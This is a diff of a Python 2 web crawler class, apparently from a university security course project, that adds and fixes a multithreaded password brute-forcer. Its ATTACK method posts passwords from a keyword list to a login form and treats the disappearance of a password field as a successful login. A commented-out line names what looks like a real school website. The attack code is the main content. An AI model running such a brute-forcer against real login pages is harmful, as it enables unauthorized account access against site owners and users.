@@ -1,17 +1,18 @@
 import re
 import threading
-import thread
 import time
+from threading import Thread
 import socket
 from urlparse import urlparse
 from bs4 import BeautifulSoup
 from postInfo import postInfo
 
+attempts = []
+success = False
+login_cred = ""
 
 class Requester:
-    attempts = []
-    success = False
-    login_cred = ""
+    pattern = re.compile("([3-5]..)")
     host = ""
     user_agent = "CSE361-KappaBot"
     const = ("GET {0} HTTP/1.1\r\n"
@@ -23,7 +24,6 @@ class Requester:
                     "Connection: Keep-Alive\r\n")
     def __init__(self, domain):
         self.host = domain.replace('http://', '')
-        print self.host
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.settimeout(1)
         # Handle if connection not made
@@ -39,11 +39,9 @@ class Requester:
         # path = path[path.find('/')+1:]
         # path = path[path.find('/'):]
         path = urlparse(url).path.rstrip()
-        print path
 
         header = self.const.format(str(path),self.host,self.user_agent)
 
-        print header
         #"Cache-Control: no-cache, no-store, must-revalidate\r\n"
         if cookies:
             cookie_string = ""
@@ -52,7 +50,6 @@ class Requester:
                 cookie_string += " "
             header += "Cookie: {}".format(cookie_string[:-2])+"\r\n"
         header += "\r\n"
-        print header
         self.sock.send(header)
         response_header = ""
         response = ""
@@ -84,8 +81,7 @@ class Requester:
         # print response_header
         response = initial_response[initial_response.find('<html'):]
         #Handle Error Codes
-        pattern = re.compile("([3-5]..)")
-        if(pattern.match(status_code)):
+        if(self.pattern.match(status_code)):
             return -1
 
         self.sock.send(header)
@@ -138,7 +134,7 @@ class Requester:
         header += "\r\n"
         header += body + "\r\n\r\n"
         # print header
-        print header
+        #print header
         response = ""
         try:
             self.sock.send(header)
@@ -150,14 +146,50 @@ class Requester:
             #find HTML or html
             if response.find("<html>") != -1:
                 response = response[:response.find('</html>')+7]
-            print response
+            #print response
             return response
+
+    def ATTACK(self, low, high, info, query, passwords):
+        global attempts
+        global success
+        global login_cred
+        status = re.compile('3\d{2}')
+        for i in range(low,high):
+            print success
+            if success:
+                return None
+            query["password"] = passwords[i]
+            attempts.append(query)
+            r = Requester(self.host)
+            response = r.post(info, query)
+            response_code = response.splitlines()[0]
+            redirect = status.search(response_code)
+            if redirect:
+                new_host_index = response.find("Location: ") + len("Location: ")
+                new_host_end = response[new_host_index:].find('\n') + new_host_index
+                new_host = response[new_host_index:new_host_end]
+                new_host = urlparse(new_host).path
+                new_host = 'http://' + r.host + '/' + new_host
+                response = r.get(new_host, cookies=info.cookies)
+                #print response.response_body
+            #If response is redirect (3**) then call get on the url at location: xxxx
+            #Else its probably js and just check the page returned for password
+            soup = BeautifulSoup(response.response_body, "html.parser")
+            if soup.findAll(type ="password"):
+                #False if Login successful(supposedly)
+                continue
+            else:
+                login_cred = query 
+                success = True
+        return None
 
 #Returns Dictionary of correct credentials if successful bruteforce.
 #Unsuccessful Bruteforces return null
     def bruteForce(self, url, username, keywords, action, login_field, password_field):
         #r = Requester(url)
+        print "URL "+str(url)
         info  = self.get(url)
+        print info.url
         #Assume action doesnt have a slash
         info.url = info.url+action[1:]
         #Attempt to login
@@ -188,46 +220,15 @@ class Requester:
         #    else:
         #        return {"Username": username, "Password": password}
         threads = []
-        for i in range(3):
+        for i in range(4):
             low = (len(keywords)/4)*i
             high = (len(keywords)/4)*(i+1)
-            threads[i] = Thread(target=ATTACK, args=(low, high, info, query, keywords)
+            threads.append(Thread(target=self.ATTACK, args=(low, high, info, {login_field:username}, keywords)))
             threads[i].start()
-
         for t in threads:
             t.join()
-        return 
+        return login_cred 
     
-    def ATTACK(self, low, high, info, query, passwords):
-        global attempts
-        global success
-        global login_cred
-        for i in range(low,high):
-            if success:
-                return None
-            query[password] = passwords[i]
-            r = Requester(self.host)
-            response = r.post(info, query)
-            response_code = response.splitlines()[0]
-            redirect = re.search('3\d{2}',response_code)
-            if redirect:
-                new_host_index = response.find("Location: ") + len("Location: ")
-                new_host_end = response[new_host_index:].find('\n') + new_host_index
-                new_host = response[new_host_index:new_host_end]
-                new_host = urlparse(new_host).path
-                new_host = 'http://' + r.host + '/' + new_host
-                response = r.get(new_host, cookies=info.cookies)
-                print response.response_body
-            #If response is redirect (3**) then call get on the url at location: xxxx
-            #Else its probably js and just check the page returned for password
-            soup = BeautifulSoup(response.response_body, "html.parser")
-            if soup.findAll(type ="password"):
-                #False if Login successful(supposedly)
-                continue
-            else:
-                login_cred =  (username, password)
-                success = True
-        return None
 
 
 #path = 'http://austinchildrensacademy.org'
